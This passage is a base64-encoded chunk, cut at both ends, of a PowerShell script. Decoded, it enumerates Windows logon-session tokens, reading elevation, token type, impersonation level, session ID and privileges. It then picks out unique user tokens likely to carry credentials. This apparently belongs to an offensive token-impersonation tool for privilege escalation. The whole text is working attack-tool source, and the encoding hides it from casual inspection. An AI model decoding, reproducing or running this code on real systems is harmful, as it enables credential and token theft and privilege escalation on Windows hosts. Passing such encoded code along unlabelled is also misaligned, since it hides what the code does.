CRSZXR1cm5PYmogfCBBZGQtTWVtYmVyIC1UeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJc0VsZXZhdGVkIC1WYWx1ZSAkZmFsc2UKCiAgICAgICAgICAgICAgICAgICAgJFRva2VuRWxldmF0aW9uU2l6ZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV0kVE9LRU5fRUxFVkFUSU9OKQogICAgICAgICAgICAgICAgICAgICRUb2tlbkVsZXZhdGlvblB0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkVG9rZW5FbGV2YXRpb25TaXplKQogICAgICAgICAgICAgICAgICAgIFtVSW50MzJdJFJlYWxTaXplID0gMAogICAgICAgICAgICAgICAgICAgICRTdWNjZXNzID0gJEdldFRva2VuSW5mb3JtYXRpb24uSW52b2tlKCRoVG9rZW4sICRUT0tFTl9JTkZPUk1BVElPTl9DTEFTUzo6VG9rZW5FbGV2YXRpb24sICRUb2tlbkVsZXZhdGlvblB0ciwgJFRva2VuRWxldmF0aW9uU2l6ZSwgW1JlZl0kUmVhbFNpemUpCiAgICAgICAgICAgICAgICAgICAgaWYgKC1ub3QgJFN1Y2Nlc3MpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkRXJyb3JDb2RlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKQogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJHZXRUb2tlbkluZm9ybWF0aW9uIGZhaWxlZCB0byByZXRyaWV2ZSBUb2tlbkVsZXZhdGlvbiBzdGF0dXMuIEVycm9yQ29kZTogJEVycm9yQ29kZSIgCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRUb2tlbkVsZXZhdGlvbiA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRUb2tlbmVsZXZhdGlvblB0ciwgW1R5cGVdJFRPS0VOX0VMRVZBVElPTikKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRUb2tlbkVsZXZhdGlvbi5Ub2tlbklzRWxldmF0ZWQgLW5lIDApCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRSZXR1cm5PYmouSXNFbGV2YXRlZCA9ICR0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6RnJlZUhHbG9iYWwoJFRva2VuRWxldmF0aW9uUHRyKQoKCiAgICAgICAgICAgICAgICAgICAgI1F1ZXJ5IHRoZSB0b2tlbiB0eXBlIHRvIGRldGVybWluZSBpZiB0aGUgdG9rZW4gaXMgYSBwcmltYXJ5IG9yIGltcGVyc29uYXRpb24gdG9rZW4KICAgICAgICAgICAgICAgICAgICAkUmV0dXJuT2JqIHwgQWRkLU1lbWJlciAtVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgVG9rZW5UeXBlIC1WYWx1ZSAiVW5hYmxlVG9SZXRyaWV2ZSIKCiAgICAgICAgICAgICAgICAgICAgW1VJbnQzMl0kVG9rZW5UeXBlU2l6ZSA9IDQKICAgICAgICAgICAgICAgICAgICBbSW50UHRyXSRUb2tlblR5cGVQdHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoJFRva2VuVHlwZVNpemUpCiAgICAgICAgICAgICAgICAgICAgW1VJbnQzMl0kUmVhbFNpemUgPSAwCiAgICAgICAgICAgICAgICAgICAgJFN1Y2Nlc3MgPSAkR2V0VG9rZW5JbmZvcm1hdGlvbi5JbnZva2UoJGhUb2tlbiwgJFRPS0VOX0lORk9STUFUSU9OX0NMQVNTOjpUb2tlblR5cGUsICRUb2tlblR5cGVQdHIsICRUb2tlblR5cGVTaXplLCBbUmVmXSRSZWFsU2l6ZSkKICAgICAgICAgICAgICAgICAgICBpZiAoLW5vdCAkU3VjY2VzcykKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRFcnJvckNvZGUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpCiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIkdldFRva2VuSW5mb3JtYXRpb24gZmFpbGVkIHRvIHJldHJpZXZlIFRva2VuSW1wZXJzb25hdGlvbkxldmVsIHN0YXR1cy4gRXJyb3JDb2RlOiAkRXJyb3JDb2RlIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBbVUludDMyXSRUb2tlblR5cGUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkVG9rZW5UeXBlUHRyLCBbVHlwZV1bVUludDMyXSkKICAgICAgICAgICAgICAgICAgICAgICAgc3dpdGNoKCRUb2tlblR5cGUpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDEgeyRSZXR1cm5PYmouVG9rZW5UeXBlID0gIlByaW1hcnkifQogICAgICAgICAgICAgICAgICAgICAgICAgICAgMiB7JFJldHVybk9iai5Ub2tlblR5cGUgPSAiSW1wZXJzb25hdGlvbiJ9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6RnJlZUhHbG9iYWwoJFRva2VuVHlwZVB0cikKCgogICAgICAgICAgICAgICAgICAgICNRdWVyeSB0aGUgaW1wZXJzb25hdGlvbiBsZXZlbCBpZiB0aGUgdG9rZW4gaXMgYW4gSW1wZXJzb25hdGlvbiB0b2tlbgogICAgICAgICAgICAgICAgICAgIGlmICgkUmV0dXJuT2JqLlRva2VuVHlwZSAtaWVxICJJbXBlcnNvbmF0aW9uIikKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRSZXR1cm5PYmogfCBBZGQtTWVtYmVyIC1UeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJbXBlcnNvbmF0aW9uTGV2ZWwgLVZhbHVlICJVbmFibGVUb1JldHJpZXZlIgoKICAgICAgICAgICAgICAgICAgICAgICAgW1VJbnQzMl0kSW1wZXJzb25hdGlvbkxldmVsU2l6ZSA9IDQKICAgICAgICAgICAgICAgICAgICAgICAgW0ludFB0cl0kSW1wZXJzb25hdGlvbkxldmVsUHRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRJbXBlcnNvbmF0aW9uTGV2ZWxTaXplKSAjc2l6ZW9mIHVpbnQzMgogICAgICAgICAgICAgICAgICAgICAgICBbVUludDMyXSRSZWFsU2l6ZSA9IDAKICAgICAgICAgICAgICAgICAgICAgICAgJFN1Y2Nlc3MgPSAkR2V0VG9rZW5JbmZvcm1hdGlvbi5JbnZva2UoJGhUb2tlbiwgJFRPS0VOX0lORk9STUFUSU9OX0NMQVNTOjpUb2tlbkltcGVyc29uYXRpb25MZXZlbCwgJEltcGVyc29uYXRpb25MZXZlbFB0ciwgJEltcGVyc29uYXRpb25MZXZlbFNpemUsIFtSZWZdJFJlYWxTaXplKQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoLW5vdCAkU3VjY2VzcykKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEVycm9yQ29kZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIkdldFRva2VuSW5mb3JtYXRpb24gZmFpbGVkIHRvIHJldHJpZXZlIFRva2VuSW1wZXJzb25hdGlvbkxldmVsIHN0YXR1cy4gRXJyb3JDb2RlOiAkRXJyb3JDb2RlIgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgW1VJbnQzMl0kSW1wZXJzb25hdGlvbkxldmVsID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJEltcGVyc29uYXRpb25MZXZlbFB0ciwgW1R5cGVdW1VJbnQzMl0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzd2l0Y2ggKCRJbXBlcnNvbmF0aW9uTGV2ZWwpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMCB7ICRSZXR1cm5PYmouSW1wZXJzb25hdGlvbkxldmVsID0gIlNlY3VyaXR5QW5vbnltb3VzIiB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMSB7ICRSZXR1cm5PYmouSW1wZXJzb25hdGlvbkxldmVsID0gIlNlY3VyaXR5SWRlbnRpZmljYXRpb24iIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAyIHsgJFJldHVybk9iai5JbXBlcnNvbmF0aW9uTGV2ZWwgPSAiU2VjdXJpdHlJbXBlcnNvbmF0aW9uIiB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMyB7ICRSZXR1cm5PYmouSW1wZXJzb25hdGlvbkxldmVsID0gIlNlY3VyaXR5RGVsZWdhdGlvbiIgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkZyZWVIR2xvYmFsKCRJbXBlcnNvbmF0aW9uTGV2ZWxQdHIpCiAgICAgICAgICAgICAgICAgICAgfQoKCiAgICAgICAgICAgICAgICAgICAgI1F1ZXJ5IHRoZSB0b2tlbiBzZXNzaW9uaWQKICAgICAgICAgICAgICAgICAgICAkUmV0dXJuT2JqIHwgQWRkLU1lbWJlciAtVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgU2Vzc2lvbklEIC1WYWx1ZSAiVW5rbm93biIKCiAgICAgICAgICAgICAgICAgICAgW1VJbnQzMl0kVG9rZW5TZXNzaW9uSWRTaXplID0gNAogICAgICAgICAgICAgICAgICAgIFtJbnRQdHJdJFRva2VuU2Vzc2lvbklkUHRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRUb2tlblNlc3Npb25JZFNpemUpCiAgICAgICAgICAgICAgICAgICAgW1VJbnQzMl0kUmVhbFNpemUgPSAwCiAgICAgICAgICAgICAgICAgICAgJFN1Y2Nlc3MgPSAkR2V0VG9rZW5JbmZvcm1hdGlvbi5JbnZva2UoJGhUb2tlbiwgJFRPS0VOX0lORk9STUFUSU9OX0NMQVNTOjpUb2tlblNlc3Npb25JZCwgJFRva2VuU2Vzc2lvbklkUHRyLCAkVG9rZW5TZXNzaW9uSWRTaXplLCBbUmVmXSRSZWFsU2l6ZSkKICAgICAgICAgICAgICAgICAgICBpZiAoLW5vdCAkU3VjY2VzcykKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRFcnJvckNvZGUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpCiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIkdldFRva2VuSW5mb3JtYXRpb24gZmFpbGVkIHRvIHJldHJpZXZlIFRva2VuIFNlc3Npb25JZC4gRXJyb3JDb2RlOiAkRXJyb3JDb2RlIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBbVUludDMyXSRUb2tlblNlc3Npb25JZCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRUb2tlblNlc3Npb25JZFB0ciwgW1R5cGVdW1VJbnQzMl0pCiAgICAgICAgICAgICAgICAgICAgICAgICRSZXR1cm5PYmouU2Vzc2lvbklEID0gJFRva2VuU2Vzc2lvbklkCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkZyZWVIR2xvYmFsKCRUb2tlblNlc3Npb25JZFB0cikKCgogICAgICAgICAgICAgICAgICAgICNRdWVyeSB0aGUgdG9rZW4gcHJpdmlsZWdlcwogICAgICAgICAgICAgICAgICAgICRSZXR1cm5PYmogfCBBZGQtTWVtYmVyIC1UeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBQcml2aWxlZ2VzRW5hYmxlZCAtVmFsdWUgQCgpCiAgICAgICAgICAgICAgICAgICAgJFJldHVybk9iaiB8IEFkZC1NZW1iZXIgLVR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFByaXZpbGVnZXNBdmFpbGFibGUgLVZhbHVlIEAoKQoKICAgICAgICAgICAgICAgICAgICBbVUludDMyXSRUb2tlblByaXZpbGVnZXNTaXplID0gMTAwMAogICAgICAgICAgICAgICAgICAgIFtJbnRQdHJdJFRva2VuUHJpdmlsZWdlc1B0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkVG9rZW5Qcml2aWxlZ2VzU2l6ZSkKICAgICAgICAgICAgICAgICAgICBbVUludDMyXSRSZWFsU2l6ZSA9IDAKICAgICAgICAgICAgICAgICAgICAkU3VjY2VzcyA9ICRHZXRUb2tlbkluZm9ybWF0aW9uLkludm9rZSgkaFRva2VuLCAkVE9LRU5fSU5GT1JNQVRJT05fQ0xBU1M6OlRva2VuUHJpdmlsZWdlcywgJFRva2VuUHJpdmlsZWdlc1B0ciwgJFRva2VuUHJpdmlsZWdlc1NpemUsIFtSZWZdJFJlYWxTaXplKQogICAgICAgICAgICAgICAgICAgIGlmICgtbm90ICRTdWNjZXNzKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJEVycm9yQ29kZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCkKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiR2V0VG9rZW5JbmZvcm1hdGlvbiBmYWlsZWQgdG8gcmV0cmlldmUgVG9rZW4gU2Vzc2lvbklkLiBFcnJvckNvZGU6ICRFcnJvckNvZGUiCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRUb2tlblByaXZpbGVnZXMgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkVG9rZW5Qcml2aWxlZ2VzUHRyLCBbVHlwZV0kVE9LRU5fUFJJVklMRUdFUykKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICNMb29wIHRocm91Z2ggZWFjaCBwcml2aWxlZ2UKICAgICAgICAgICAgICAgICAgICAgICAgW0ludFB0cl0kUHJpdmlsZWdlc0Jhc2VQdHIgPSBbSW50UHRyXShBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkVG9rZW5Qcml2aWxlZ2VzUHRyIChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpPZmZzZXRPZihbVHlwZV0kVE9LRU5fUFJJVklMRUdFUywgIlByaXZpbGVnZXMiKSkpCiAgICAgICAgICAgICAgICAgICAgICAgICRMdWlkQW5kQXR0cmlidXRlU2l6ZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV0kTFVJRF9BTkRfQVRUUklCVVRFUykKICAgICAgICAgICAgICAgICAgICAgICAgZm9yICgkaSA9IDA7ICRpIC1sdCAkVG9rZW5Qcml2aWxlZ2VzLlByaXZpbGVnZUNvdW50OyAkaSsrKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTHVpZEFuZEF0dHJpYnV0ZVB0ciA9IFtJbnRQdHJdKEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRQcml2aWxlZ2VzQmFzZVB0ciAoJEx1aWRBbmRBdHRyaWJ1dGVTaXplICogJGkpKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRMdWlkQW5kQXR0cmlidXRlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJEx1aWRBbmRBdHRyaWJ1dGVQdHIsIFtUeXBlXSRMVUlEX0FORF9BVFRSSUJVVEVTKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICNMb29rdXAgcHJpdmlsZWdlIG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFtVSW50MzJdJFByaXZpbGVnZU5hbWVTaXplID0gNjAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRQcml2aWxlZ2VOYW1lUHRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRQcml2aWxlZ2VOYW1lU2l6ZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRQTHVpZCA9ICRMdWlkQW5kQXR0cmlidXRlUHRyICNUaGUgTHVpZCBzdHJ1Y3R1cmUgaXMgdGhlIGZpcnN0IG9iamVjdCBpbiB0aGUgTHVpZEFuZEF0dHJpYnV0ZXMgc3RydWN0dXJlLCBzbyBhIHB0ciB0byBMdWlkQW5kQXR0cmlidXRlcyBhbHNvIHBvaW50cyB0byBMdWlkCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFN1Y2Nlc3MgPSAkTG9va3VwUHJpdmlsZWdlTmFtZVcuSW52b2tlKFtJbnRQdHJdOjpaZXJvLCAkUEx1aWQsICRQcml2aWxlZ2VOYW1lUHRyLCBbUmVmXSRQcml2aWxlZ2VOYW1lU2l6ZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgtbm90ICRTdWNjZXNzKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRFcnJvckNvZGUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiQ2FsbCB0byBMb29rdXBQcml2aWxlZ2VOYW1lVyBmYWlsZWQuIEVycm9yIGNvZGU6ICRFcnJvckNvZGUuIFJlYWxTaXplOiAkUHJpdmlsZWdlTmFtZVNpemUiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUHJpdmlsZWdlTmFtZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RyaW5nVW5pKCRQcml2aWxlZ2VOYW1lUHRyKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICNHZXQgdGhlIHByaXZpbGVnZSBhdHRyaWJ1dGVzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUHJpdmlsZWdlU3RhdHVzID0gIiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRFbmFibGVkID0gJGZhbHNlCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRMdWlkQW5kQXR0cmlidXRlLkF0dHJpYnV0ZXMgLWVxIDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEVuYWJsZWQgPSAkZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoJEx1aWRBbmRBdHRyaWJ1dGUuQXR0cmlidXRlcyAtYmFuZCAkV2luMzJDb25zdGFudHMuU0VfUFJJVklMRUdFX0VOQUJMRURfQllfREVGQVVMVCkgLWVxICRXaW4zMkNvbnN0YW50cy5TRV9QUklWSUxFR0VfRU5BQkxFRF9CWV9ERUZBVUxUKSAjZW5hYmxlZCBieSBkZWZhdWx0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEVuYWJsZWQgPSAkdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCgkTHVpZEFuZEF0dHJpYnV0ZS5BdHRyaWJ1dGVzIC1iYW5kICRXaW4zMkNvbnN0YW50cy5TRV9QUklWSUxFR0VfRU5BQkxFRCkgLWVxICRXaW4zMkNvbnN0YW50cy5TRV9QUklWSUxFR0VfRU5BQkxFRCkgI2VuYWJsZWQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRW5hYmxlZCA9ICR0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoKCRMdWlkQW5kQXR0cmlidXRlLkF0dHJpYnV0ZXMgLWJhbmQgJFdpbjMyQ29uc3RhbnRzLlNFX1BSSVZJTEVHRV9SRU1PVkVEKSAtZXEgJFdpbjMyQ29uc3RhbnRzLlNFX1BSSVZJTEVHRV9SRU1PVkVEKSAjU0VfUFJJVklMRUdFX1JFTU9WRUQuIFRoaXMgc2hvdWxkIG5ldmVyIGV4aXN0LiBXcml0ZSBhIHdhcm5pbmcgaWYgaXQgaXMgZm91bmQgc28gSSBjYW4gaW52ZXN0aWdhdGUgd2h5L2hvdyBpdCB3YXMgZm91bmQuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiVW5leHBlY3RlZCBiZWhhdmlvcjogRm91bmQgYSB0b2tlbiB3aXRoIFNFX1BSSVZJTEVHRV9SRU1PVkVELiBQbGVhc2UgcmVwb3J0IHRoaXMgYXMgYSBidWcuICIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJEVuYWJsZWQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJldHVybk9iai5Qcml2aWxlZ2VzRW5hYmxlZCArPSAsJFByaXZpbGVnZU5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUmV0dXJuT2JqLlByaXZpbGVnZXNBdmFpbGFibGUgKz0gLCRQcml2aWxlZ2VOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6RnJlZUhHbG9iYWwoJFByaXZpbGVnZU5hbWVQdHIpCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6RnJlZUhHbG9iYWwoJFRva2VuUHJpdmlsZWdlc1B0cikKCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiQ2FsbCB0byBMc2FHZXRMb2dvblNlc3Npb25EYXRhIHN1Y2NlZWRlZC4gVGhpcyBTSE9VTEQgYmUgU1lTVEVNIHNpbmNlIHRoZXJlIGlzIG5vIGRhdGEuICQoJExvZ29uU2Vzc2lvbkRhdGEuVXNlck5hbWUuTGVuZ3RoKSIKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAjRnJlZSBMb2dvblNlc3Npb25EYXRhCiAgICAgICAgICAgICAgICAkbnRzdGF0dXMgPSAkTHNhRnJlZVJldHVybkJ1ZmZlci5JbnZva2UoJExvZ29uU2Vzc2lvbkRhdGFQdHIpCiAgICAgICAgICAgICAgICAkTG9nb25TZXNzaW9uRGF0YVB0ciA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgICAgICAgICBpZiAoJG50c3RhdHVzIC1uZSAwKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIkNhbGwgdG8gTHNhRnJlZVJldHVybkJ1ZmZlciBmYWlsZWQuIEVycm9yIGNvZGU6ICRudHN0YXR1cyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6RnJlZUhHbG9iYWwoJEx1aWRQdHIpCiAgICAgICAgICAgICRMdWlkUHRyID0gW0ludFB0cl06Olplcm8KICAgICAgICB9CgogICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkZyZWVIR2xvYmFsKCRUb2tlblN0YXRzUHRyKQogICAgICAgICRUb2tlblN0YXRzUHRyID0gW0ludFB0cl06Olplcm8KCiAgICAgICAgcmV0dXJuICRSZXR1cm5PYmoKICAgIH0KCgogICAgI1Rha2VzIGFuIGFycmF5IG9mIFRva2VuT2JqZWN0cyBidWlsdCBieSB0aGUgc2NyaXB0IGFuZCByZXR1cm5zIHRoZSB1bmlxdWUgb25lcwogICAgZnVuY3Rpb24gR2V0LVVuaXF1ZVRva2VucwogICAgewogICAgICAgIFBhcmFtKAogICAgICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uPTAsIE1hbmRhdG9yeT0kdHJ1ZSldCiAgICAgICAgICAgIFtPYmplY3RbXV0KICAgICAgICAgICAgJEFsbFRva2VucwogICAgICAgICkKCiAgICAgICAgJFRva2VuQnlVc2VyID0gQHt9CiAgICAgICAgJFRva2VuQnlFbmFibGVkUHJpdiA9IEB7fQogICAgICAgICRUb2tlbkJ5QXZhaWxhYmxlUHJpdiA9IEB7fQoKICAgICAgICAjRmlsdGVyIHRva2VucyBieSB1c2VyCiAgICAgICAgZm9yZWFjaCAoJFRva2VuIGluICRBbGxUb2tlbnMpCiAgICAgICAgewogICAgICAgICAgICAkS2V5ID0gJFRva2VuLkRvbWFpbiArICJcIiArICRUb2tlbi5Vc2VybmFtZQogICAgICAgICAgICBpZiAoLW5vdCAkVG9rZW5CeVVzZXIuQ29udGFpbnNLZXkoJEtleSkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICNGaWx0ZXIgb3V0IG5ldHdvcmsgbG9nb25zIGFuZCBqdW5rIFdpbmRvd3MgYWNjb3VudHMuIFRoaXMgZmlsdGVyIGVsaW1pbmF0ZXMgYWNjb3VudHMgd2hpY2ggd29uJ3QgaGF2ZSBjcmVkcyBiZWNhdXNlCiAgICAgICAgICAgICAgICAjICAgIHRoZXkgYXJlIG5ldHdvcmsgbG9nb25zICh0eXBlIDMpIG9yIGxvZ29ucyBmb3Igd2hpY2ggdGhlIGNyZWRzIGRvbid0IG1hdHRlciBsaWtlIExPQ09BTCBTRVJWSUNFLCBEV00sIGV0Yy4uCiAgICAgICAgICAgICAgICBpZiAoJFRva2VuLkxvZ29uVHlwZSAtbmUgMyAtYW5kCiAgICAgICAgICAgICAgICAgICAgJFRva2VuLlVzZXJuYW1lIC1pbm90bWF0Y2ggIl5EV00tXGQrJCIgLWFuZAogICAgICAgI